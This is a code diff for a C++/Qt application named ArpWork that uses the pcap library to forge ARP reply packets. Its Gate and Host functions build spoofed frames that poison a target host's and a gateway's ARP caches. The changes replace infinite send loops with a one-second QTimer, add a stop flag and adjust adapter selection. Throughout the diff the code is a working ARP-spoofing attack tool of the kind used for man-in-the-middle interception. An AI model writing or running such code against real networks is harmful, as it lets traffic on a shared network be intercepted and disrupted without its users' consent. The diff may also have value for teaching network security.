@@ -1,9 +1,20 @@
 #include "ArpWork.h"
+#include<qtimer.h>
+QString frame = "Send Arp";
+int flag = 1;
+
 
 ArpWork::ArpWork(QWidget* parent)
     : QMainWindow(parent)
 {
     ui.setupUi(this);
+     timer = new QTimer();
+
+    connect(ui.pushButton_3, &QPushButton::clicked, timer, [&] {
+        timer->start(1000);
+        });
+    connect(timer, &QTimer::timeout, this, &ArpWork::send);
+
 }
 
 ArpWork::~ArpWork()
@@ -30,17 +41,23 @@ int Gate(pcap_t* adhandle , string TargetHostIP, string GateIP, u_char TargetHos
 {
     //伪造ARP Relpy包
     //目标信息
-    string DstIP = TargetHostIP;
+    string DstIP = TargetHostIP; 
+    u_char DstMAC[6];// = { 0x00, 0x0C, 0x29, 0xDE, 0x4F, 0x78 };
     //源信息
-    string SrcIP = GateIP;
-
+    string SrcIP = GateIP; 
+    u_char SrcMAC[6];// = { 0x00,0x50,0x56,0xC0,0x00,0x08 };
+        for (int i = 0; i < 6; i++) {
+           DstMAC[i] = TargetHostMAC[i];
+           SrcMAC[i] = HostMAC[i];
+        }
     eth_head eh;        //以太网头
     arp_head ah;        //ARP头
 
     for (int i = 0; i < 6; i++)
-        eh.destMAC.byte[i] = TargetHostMAC[i];
+        eh.destMAC.byte[i] = DstMAC[i];
     for (int i = 0; i < 6; i++)
-        eh.sourceMAC.byte[i] = HostMAC[i];
+        eh.sourceMAC.byte[i] = SrcMAC[i];
+
     eh.type = htons(0x0806);        //ARP类型
 
     ah.hardwareType = htons(0x0001);
@@ -56,18 +73,22 @@ int Gate(pcap_t* adhandle , string TargetHostIP, string GateIP, u_char TargetHos
     arp_packet* apt = NULL;
     unsigned char sendbuffer[80];
     memset(sendbuffer, 0, sizeof(sendbuffer));
+
     apt = (arp_packet*)sendbuffer;
     apt->apt_eth_head = eh;
     apt->apt_arp_head = ah;
+    int k = sizeof(eh);
+    int q = sizeof(arp_head);
+    int size_long = sizeof(unsigned long);
 
-    while (true)
-    {
+   // while (flag)
+   // {
         if (pcap_sendpacket(adhandle, sendbuffer, sizeof(sendbuffer)) != 0)
         {
             return -1;
         }
-        Sleep(100);
-    }
+       // Sleep(100);
+   // }
     return 0;
 }
 
@@ -104,15 +125,14 @@ int Host(pcap_t* adhandle, string TargetHostIP, string GateIP, u_char HostMAC[6]
     apt = (arp_packet*)sendbuffer;
     apt->apt_eth_head = eh;
     apt->apt_arp_head = ah;
-
-    while (true)
-    {
+   // while (flag) {
         if (pcap_sendpacket(adhandle, sendbuffer, sizeof(sendbuffer)) != 0)
         {
             return -1;
         }
-        Sleep(100);
-    }
+      //  Sleep(100);
+        flag = 0;
+   // }
     return 0;
 }
 
@@ -139,19 +159,20 @@ void ArpWork::send()
         return;
     }
 
-    while (true)
+    //while (true)
     {
         QString number = ui.lineEdit_3->text();
-        int n = number.toInt();
+        int n = number.toInt() + 1;
 
         if (n < 0 || n >= i)
         {
             pcap_freealldevs(alldevs);
-            return ;
+            return;
         }
-        for (d = alldevs, i = 0; i < n+1; d = d->next, i++);
-        break;
+        for (d = alldevs, i = 0; i < n; d = d->next, i++);
+        //break;
     }
+    //}
 
     //打开与网络适配器绑定的设备
     pcap_t* adhandle;
@@ -198,7 +219,6 @@ void ArpWork::send()
             MAC_Buffer[i] = (ch1 << 0x04) | ch2;
             TargetHostMAC[i] = (char)MAC_Buffer[i];
         }
-
         Gate(adhandle, TargetHostIP, GateIP, TargetHostMAC, HostMAC);
 
     }
@@ -346,7 +366,6 @@ void ArpWork::getIP(){
     }
 }
 
-void ArpWork::stop()
-{
-    ui.lineEdit_5->setText("##");
+void ArpWork::stop() {
+    flag = 0;
 }
